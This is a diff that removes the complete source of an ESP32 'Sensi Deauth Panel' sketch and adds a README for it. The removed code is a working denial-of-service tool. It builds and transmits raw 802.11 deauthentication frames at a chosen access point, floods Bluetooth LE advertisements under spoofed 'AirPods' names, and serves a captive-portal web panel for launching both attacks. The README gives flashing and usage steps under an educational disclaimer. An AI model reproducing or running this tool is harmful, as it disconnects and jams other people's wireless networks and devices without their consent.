@@ -1,566 +1,102 @@
-/*
- * Sensi Deauth Panel - ESP32 WiFi & Bluetooth Attack Tool
- *
- * Strictly for educational and authorized testing purposes.
- * By using this software, you agree to take full responsibility for your actions.
- *
- * Features:
- * - SoftAP with static IP 192.168.69.1
- * - Mobile-responsive web UI
- * - WiFi Scanner
- * - WiFi Deauthentication Attack
- * - Bluetooth LE Advertising Flood
- * - Real-time status and logs via WebSockets
- * - Captive Portal to auto-launch the UI
- */
-
-// Core Libraries
-#include <WiFi.h>
-#include <esp_wifi.h>
-
-// Web Server Libraries
-#include <AsyncTCP.h>
-#include <ESPAsyncWebServer.h>
-#include <DNSServer.h>
-
-// Bluetooth Libraries
-#include <BLEDevice.h>
-#include <BLEUtils.h>
-#include <BLEServer.h>
-#include <BLEAdvertising.h>
-
-// ================================================================
-//                       CONFIGURATION
-// ================================================================
-const char *ssid = "Sensi Deauth Panel";
-const char *password = "password123";
-
-// Static IP configuration
-IPAddress local_IP(192, 168, 69, 1);
-IPAddress gateway(192, 168, 69, 1);
-IPAddress subnet(255, 255, 255, 0);
-
-// ================================================================
-//                       GLOBAL VARIABLES
-// ================================================================
-AsyncWebServer server(80);
-DNSServer dnsServer;
-AsyncWebSocket ws("/ws");
-
-// Attack state flags
-bool deauthRunning = false;
-bool bleFloodRunning = false;
-unsigned long attackStartTime = 0;
-
-// Deauth target info
-uint8_t target_bssid[6];
-int target_channel;
-
-// For tracking uptime
-unsigned long startTime = 0;
-
-// ================================================================
-//                       WEB UI (HTML/CSS/JS)
-// ================================================================
-const char index_html[] PROGMEM = R"rawliteral(
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sensi Deauth Panel</title>
-    <style>
-        :root {
-            --bg-color: #1a1a1a;
-            --text-color: #e0e0e0;
-            --primary-color: #007bff;
-            --danger-color: #dc3545;
-            --success-color: #28a745;
-            --card-bg: #2c2c2c;
-            --border-color: #444;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            margin: 0;
-            padding: 15px;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .header h1 {
-            margin: 0;
-            color: var(--primary-color);
-        }
-        .card {
-            background-color: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            margin-top: 0;
-            border-bottom: 2px solid var(--primary-color);
-            padding-bottom: 5px;
-            margin-bottom: 15px;
-        }
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 10px;
-        }
-        .status-item {
-            background-color: var(--bg-color);
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-        }
-        .status-item span {
-            display: block;
-            font-size: 0.9em;
-            color: #aaa;
-        }
-        button {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1em;
-            width: 100%;
-            margin-top: 10px;
-        }
-        button:hover {
-            opacity: 0.9;
-        }
-        button.btn-danger { background-color: var(--danger-color); }
-        button.btn-success { background-color: var(--success-color); }
-        select, input {
-            width: 100%;
-            padding: 10px;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            border: 1px solid var(--border-color);
-            border-radius: 5px;
-            margin-bottom: 10px;
-        }
-        #log-container {
-            background-color: #000;
-            border: 1px solid var(--border-color);
-            border-radius: 5px;
-            height: 200px;
-            overflow-y: scroll;
-            padding: 10px;
-            font-family: "Courier New", Courier, monospace;
-            font-size: 0.9em;
-            white-space: pre-wrap;
-        }
-        .warning-banner {
-            background-color: var(--danger-color);
-            color: white;
-            padding: 10px;
-            text-align: center;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>Sensi Deauth Panel</h1>
-            <p>ESP32 Network Test Tool</p>
-        </div>
-
-        <div class="warning-banner">
-            ⚠️ For Educational & Testing Purposes ONLY. Use responsibly on your own devices.
-        </div>
-
-        <div class="card">
-            <h2>Device Status</h2>
-            <div class="status-grid">
-                <div class="status-item"><span id="uptime">--</span>Uptime</div>
-                <div class="status-item"><span id="ip-address">192.168.69.1</span>IP Address</div>
-                <div class="status-item"><span id="attack-mode">IDLE</span>Mode</div>
-            </div>
-        </div>
-
-        <div class="card">
-            <h2>WiFi Attack</h2>
-            <button id="scan-wifi" class="btn-success">Scan for WiFi Networks</button>
-            <select id="ssid-select" disabled>
-                <option>Scan first...</option>
-            </select>
-            <button id="start-deauth" class="btn-danger" disabled>Start Deauth Attack</button>
-        </div>
-
-        <div class="card">
-            <h2>Bluetooth Attack</h2>
-            <button id="start-ble-flood" class="btn-danger">Start BLE Spam</button>
-        </div>
-
-        <div class="card">
-            <button id="stop-all" class="btn-danger" style="background-color: #ffc107; color: black;" disabled>Stop All Attacks</button>
-        </div>
-
-        <div class="card">
-            <h2>Live Logs</h2>
-            <div id="log-container"></div>
-        </div>
-    </div>
-
-    <script>
-        const ws = new WebSocket(`ws://${window.location.host}/ws`);
-        const logContainer = document.getElementById('log-container');
-
-        const uptimeElem = document.getElementById('uptime');
-        const attackModeElem = document.getElementById('attack-mode');
-        const scanBtn = document.getElementById('scan-wifi');
-        const ssidSelect = document.getElementById('ssid-select');
-        const startDeauthBtn = document.getElementById('start-deauth');
-        const startBleBtn = document.getElementById('start-ble-flood');
-        const stopAllBtn = document.getElementById('stop-all');
-
-        function addLog(message) {
-            logContainer.innerHTML += message + '<br>';
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
-
-        ws.onopen = () => addLog('SYSTEM: WebSocket connection established.');
-        ws.onmessage = (event) => addLog(event.data);
-        ws.onclose = () => addLog('SYSTEM: WebSocket connection lost. Please refresh.');
-
-        function formatUptime(seconds) {
-            const d = Math.floor(seconds / (3600*24));
-            const h = Math.floor(seconds % (3600*24) / 3600);
-            const m = Math.floor(seconds % 3600 / 60);
-            const s = Math.floor(seconds % 60);
-            return `${d}d ${h}h ${m}m ${s}s`;
-        }
-
-        async function updateStatus() {
-            try {
-                const response = await fetch('/status');
-                const data = await response.json();
-                uptimeElem.textContent = formatUptime(data.uptime);
-                attackModeElem.textContent = data.mode;
-
-                const isAttacking = data.mode !== 'IDLE';
-                stopAllBtn.disabled = !isAttacking;
-                startDeauthBtn.disabled = isAttacking || ssidSelect.value === '';
-                startBleBtn.disabled = isAttacking;
-                scanBtn.disabled = isAttacking;
-            } catch (e) {
-                addLog('ERROR: Failed to fetch status.');
-            }
-        }
-
-        scanBtn.addEventListener('click', async () => {
-            addLog('WIFI: Starting scan...');
-            scanBtn.textContent = 'Scanning...';
-            scanBtn.disabled = true;
-            try {
-                const response = await fetch('/scan');
-                const networks = await response.json();
-                ssidSelect.innerHTML = '<option value="">-- Select a Target --</option>';
-                networks.forEach(net => {
-                    const option = document.createElement('option');
-                    option.value = `${net.bssid}|${net.channel}`;
-                    option.textContent = `(${net.rssi}dBm) ${net.ssid} [Ch: ${net.channel}]`;
-                    ssidSelect.appendChild(option);
-                });
-                ssidSelect.disabled = false;
-                startDeauthBtn.disabled = ssidSelect.value === '';
-                addLog(`WIFI: Scan complete. Found ${networks.length} networks.`);
-            } catch (e) {
-                addLog('ERROR: WiFi scan failed.');
-            }
-            scanBtn.textContent = 'Scan for WiFi Networks';
-            scanBtn.disabled = false;
-        });
-        
-        ssidSelect.addEventListener('change', () => {
-            startDeauthBtn.disabled = ssidSelect.value === '';
-        });
-
-        startDeauthBtn.addEventListener('click', () => {
-            const selection = ssidSelect.value;
-            if (!selection) {
-                alert('Please select a WiFi network first.');
-                return;
-            }
-            const [bssid, channel] = selection.split('|');
-            const ssidName = ssidSelect.options[ssidSelect.selectedIndex].text.split('] ')[1] || "Selected Network";
-            addLog(`ATTACK: Starting Deauth on ${ssidName}`);
-            fetch(`/startDeauth?bssid=${bssid}&channel=${channel}`);
-        });
-
-        startBleBtn.addEventListener('click', () => {
-            addLog('ATTACK: Starting Bluetooth LE Spam...');
-            fetch('/startBleFlood');
-        });
-
-        stopAllBtn.addEventListener('click', () => {
-            addLog('ATTACK: Stopping all operations...');
-            fetch('/stop');
-        });
-
-        setInterval(updateStatus, 2000);
-        updateStatus();
-    </script>
-</body>
-</html>
-)rawliteral";
+# Sensi Deauth Panel
 
 
-// ================================================================
-//                       HELPER FUNCTIONS
-// ================================================================
-void sendLog(String message) {
-    ws.textAll(message);
-    Serial.println(message);
-}
 
-// Function to parse BSSID string to byte array
-void mac_str_to_uint8(const char* mac_str, uint8_t* mac_array) {
-    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &mac_array[0], &mac_array[1], &mac_array[2],
-           &mac_array[3], &mac_array[4], &mac_array[5]);
-}
+**Sensi Deauth Panel** is a multi-purpose, mobile-friendly ESP32-based tool for network testing and security education. It hosts a web interface on its own WiFi network, allowing you to control all its features directly from a mobile phone browser without needing a PC or any special apps.
 
-// ================================================================
-//                       ATTACK PAYLOADS
-// ================================================================
+---
 
-// 802.11 Deauthentication Frame
-uint8_t deauth_frame[] = {
-    0xc0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Target AP
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Target AP
-    0xf0, 0xff, 0x01, 0x00
-};
+## 🛡️ Legal & Ethical Warning
 
-void performDeauthAttack() {
-    // Set the BSSID and source MAC in the deauth frame
-    memcpy(&deauth_frame[10], target_bssid, 6);
-    memcpy(&deauth_frame[16], target_bssid, 6);
-    
-    // Send deauth frame
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
-    
-    // Log every few seconds to avoid spamming the logs
-    static unsigned long lastLogTime = 0;
-    if (millis() - lastLogTime > 2000) {
-        sendLog("DEAUTH: Sending deauth packets...");
-        lastLogTime = millis();
-    }
-}
+**This project is intended strictly for educational purposes and for testing on networks and devices that you own or have explicit permission to test.** Unauthorized scanning of networks, launching denial-of-service attacks (like WiFi Deauthentication or Bluetooth flooding) is illegal in most countries. The user of this software is solely responsible for their actions. The developers assume no liability and are not responsible for any misuse or damage caused by this program.
 
-void performBleFlood() {
-    static unsigned long lastBleChangeTime = 0;
-    if (millis() - lastBleChangeTime > 500) { // Change name every 500ms
-        lastBleChangeTime = millis();
+---
 
-        BLEDevice::getAdvertising()->stop();
-        
-        char randomName[16];
-        sprintf(randomName, "AirPods_%04X%04X", rand() % 0xFFFF, rand() % 0xFFFF);
-        
-        BLEDevice::init(randomName);
-        BLEServer *pServer = BLEDevice::createServer();
-        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-        pAdvertising->addServiceUUID("1234");
-        pAdvertising->setScanResponse(true);
-        pAdvertising->setMinPreferred(0x06);
-        pAdvertising->setMinPreferred(0x12);
-        BLEDevice::startAdvertising();
-        sendLog("BLE SPAM: Advertising as " + String(randomName));
-    }
-}
+## ✨ Features
 
-void stopAttacks() {
-    deauthRunning = false;
-    bleFloodRunning = false;
-    
-    // Stop BLE advertising if it was running
-    if (BLEDevice::getAdvertising()->isAdvertising()) {
-        BLEDevice::getAdvertising()->stop();
-    }
-    
-    // Return to normal channel
-    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-    sendLog("SYSTEM: All attacks stopped.");
-}
+-   **Standalone & Mobile-First:** No PC or app required. Just connect to the ESP32's WiFi from your phone.
+-   **Captive Portal:** Automatically opens the control panel when you connect to the WiFi.
+-   **Static IP:** Runs a SoftAP at the fixed IP address `192.168.69.1`.
+-   **WiFi Scanner:** Scans for nearby 2.4GHz WiFi networks and displays their SSID, signal strength (RSSI), and channel.
+-   **WiFi Deauth Attack:** Sends 802.11 deauthentication frames to a selected Access Point, disconnecting all clients connected to it.
+-   **Bluetooth LE Jammer:** Floods the 2.4GHz spectrum with BLE advertising packets with random device names (e.g., "AirPods_XXXX"), making it difficult for other BLE devices to connect.
+-   **Real-time Interface:** The web UI provides live status updates (uptime, current mode) and a log panel fed by WebSockets.
+-   **Minimalist Dark UI:** Clean, responsive, and easy-to-use interface designed for mobile screens.
 
-// ================================================================
-//                       WEB SERVER HANDLERS
-// ================================================================
+---
 
-void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
-    if (type == WS_EVT_CONNECT) {
-        Serial.printf("WebSocket client #%u connected from %s\n", client->id(), client->remoteIP().toString().c_str());
-        client->text("Welcome to Sensi Panel!");
-    } else if (type == WS_EVT_DISCONNECT) {
-        Serial.printf("WebSocket client #%u disconnected\n", client->id());
-    }
-}
+## 🔧 Hardware Required
 
-class CaptiveRequestHandler : public AsyncWebHandler {
-public:
-  CaptiveRequestHandler() {}
-  virtual ~CaptiveRequestHandler() {}
+-   An ESP32 Development Board (e.g., ESP32-WROOM-32 DevKitC)
+-   A Micro-USB cable
+-   A power source (power bank, USB wall adapter, or your phone)
 
-  bool canHandle(AsyncWebServerRequest *request){
-    //redirect all requests to the captive portal
-    return true;
-  }
+### Circuit Diagram
 
-  void handleRequest(AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", index_html);
-  }
-};
+No external wiring is needed. The ESP32 board is all you need.
 
+```
++-----------------+      (Power & Data)      +-----------------+
+|  ESP32 Dev Kit  | <----------------------> | USB Cable       |
+|    (WROOM-32)   |                          +-----------------+
++-----------------+                                    |
+                                                     (USB-OTG Adapter if using a phone)
+                                                       |
+                                             +-----------------+
+                                             |  Android Phone  |
+                                             +-----------------+
+```
 
-// ================================================================
-//                          SETUP
-// ================================================================
-void setup() {
-    Serial.begin(115200);
-    startTime = millis();
+---
 
-    // Set ESP32 to AP mode
-    WiFi.mode(WIFI_AP);
-    WiFi.softAPConfig(local_IP, gateway, subnet);
-    WiFi.softAP(ssid, password);
-    
-    // Start DNS server for captive portal
-    dnsServer.start(53, "*", local_IP);
+## 📲 How to Flash (Using Only a Mobile Phone)
 
-    Serial.println("");
-    Serial.println("Sensi Deauth Panel Initialized");
-    Serial.print("Connect to WiFi: ");
-    Serial.println(ssid);
-    Serial.print("IP address: ");
-    Serial.println(WiFi.softAPIP());
+You can flash this project onto your ESP32 using an Android phone and a USB-OTG adapter.
 
-    // Initialize WebSocket
-    ws.onEvent(onWsEvent);
-    server.addHandler(&ws);
+1.  **Install ArduinoDroid:**
+    Go to the Google Play Store and install the **[ArduinoDroid - Arduino/ESP8266/ESP32 IDE](https://play.google.com/store/apps/details?id=name.antonsmirnov.android.arduinodroid)** app.
 
-    // --- WEB SERVER ROUTES ---
+2.  **Add ESP32 Board Support:**
+    -   Open ArduinoDroid, go to `≡ (Menu)` > `Settings` > `Board type` > `ESP32`.
+    -   In the `Boards manager URLs` field, add this URL: `https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json`
+    -   Go back and tap `Boards Manager`. Search for `esp32` and install the package by `Espressif Systems`.
 
-    // Root page
-    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send_P(200, "text/html", index_html);
-    });
+3.  **Install Libraries:**
+    -   Go to `≡ (Menu)` > `Libraries`.
+    -   Search for and install the following libraries:
+        -   `ESPAsyncWebServer` (by me-no-dev)
+        -   `AsyncTCP` (by me-no-dev)
 
-    // WiFi Scan API
-    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
-        sendLog("WIFI: Scan requested from client.");
-        String json = "[";
-        int n = WiFi.scanNetworks();
-        if (n == 0) {
-            sendLog("WIFI: No networks found.");
-        } else {
-            for (int i = 0; i < n; ++i) {
-                if (i) json += ",";
-                json += "{";
-                json += "\"rssi\":" + String(WiFi.RSSI(i));
-                json += ",\"ssid\":\"" + WiFi.SSID(i) + "\"";
-                json += ",\"bssid\":\"" + WiFi.BSSIDstr(i) + "\"";
-                json += ",\"channel\":" + String(WiFi.channel(i));
-                json += "}";
-            }
-        }
-        json += "]";
-        request->send(200, "application/json", json);
-    });
+4.  **Load the Code:**
+    -   Download the `SensiDeauthPanel.ino` file to your phone.
+    -   In ArduinoDroid, go to `≡ (Menu)` > `Sketch` > `Open` and navigate to the `.ino` file you downloaded.
 
-    // Start Deauth Attack API
-    server.on("/startDeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
-        if (request->hasParam("bssid") && request->hasParam("channel")) {
-            String bssid_str = request->getParam("bssid")->value();
-            target_channel = request->getParam("channel")->value().toInt();
-            mac_str_to_uint8(bssid_str.c_str(), target_bssid);
+5.  **Flash the ESP32:**
+    -   Connect your ESP32 to your Android phone using a USB-OTG adapter. A notification should appear asking for USB permission; allow it.
+    -   In ArduinoDroid, go to `≡ (Menu)` > `Settings` > `Board type` > `ESP32` and select `ESP32 Dev Module`.
+    -   Tap the **Upload** button (the arrow pointing down: `↓`).
+    -   The app will compile the sketch. If it's the first time, this may take a few minutes.
+    -   After compiling, it will start uploading. You may need to **hold the `BOOT` button** on your ESP32 when the "Connecting..." message appears in the console. Release it once the upload begins.
+    -   Once finished, the ESP32 will reboot.
 
-            stopAttacks(); // Stop any other running attack
-            deauthRunning = true;
-            attackStartTime = millis();
+---
 
-            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
-            sendLog("DEAUTH: Attack started on BSSID " + bssid_str + " on channel " + String(target_channel));
-            request->send(200, "text/plain", "Deauth started.");
-        } else {
-            request->send(400, "text/plain", "Missing parameters.");
-        }
-    });
+## 🚀 How to Use the Panel
 
-    // Start BLE Flood Attack API
-    server.on("/startBleFlood", HTTP_GET, [](AsyncWebServerRequest *request) {
-        stopAttacks(); // Stop any other running attack
-        bleFloodRunning = true;
-        attackStartTime = millis();
-        
-        srand(micros()); // Seed random number generator
-        
-        sendLog("BLE SPAM: Attack started.");
-        request->send(200, "text/plain", "BLE Flood started.");
-    });
-    
-    // Stop All Attacks API
-    server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request) {
-        stopAttacks();
-        request->send(200, "text/plain", "All attacks stopped.");
-    });
+1.  **Connect to the ESP32:**
+    -   Power on your ESP32.
+    -   On your phone or laptop, open your WiFi settings.
+    -   Connect to the WiFi network named **`Sensi Deauth Panel`**.
+    -   The password is **`password123`**.
 
-    // Status API
-    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request){
-        String mode = "IDLE";
-        if (deauthRunning) mode = "DEAUTH ATTACK";
-        if (bleFloodRunning) mode = "BLE SPAM";
+2.  **Open the Control Panel:**
+    -   After connecting, your device should automatically detect the Captive Portal and a notification will pop up to "Sign in to network". Tap it.
+    -   The Sensi Deauth Panel interface will load directly in your browser.
+    -   If it doesn't open automatically, manually open a browser and go to `http://192.168.69.1`.
 
-        String json = "{";
-        json += "\"uptime\":" + String(millis() / 1000);
-        json += ",\"mode\":\"" + mode + "\"";
-        json += "}";
-        request->send(200, "application/json", json);
-    });
-    
-    // Captive Portal Handler - This MUST be last
-    server.addHandler(new CaptiveRequestHandler()).onNotFound([](AsyncWebServerRequest *request){
-      request->send(404); // We shouldn't ever get here
-    });
-
-    server.begin();
-}
-
-
-// ================================================================
-//                           MAIN LOOP
-// ================================================================
-void loop() {
-    // Process DNS requests for captive portal
-    dnsServer.processNextRequest();
-
-    // Clean up disconnected WebSocket clients
-    ws.cleanupClients();
-
-    // Handle ongoing attacks
-    if (deauthRunning) {
-        performDeauthAttack();
-    }
-
-    if (bleFloodRunning) {
-        performBleFlood();
-    }
-}
+3.  **Using the Features:**
+    -   **WiFi Scan:** Tap the "Scan" button. A list of nearby networks will populate the dropdown.
+    -   **Deauth Attack:** Select a network from the list and tap "Start Deauth Attack".
+    -   **BLE Spam:** Tap "Start BLE Spam" to begin the Bluetooth flood.
+    -   **Stop:** The "Stop All Attacks" button will halt any active operation.
+    -   **Logs:** The log panel at the bottom shows real-time feedback from the ESP32.
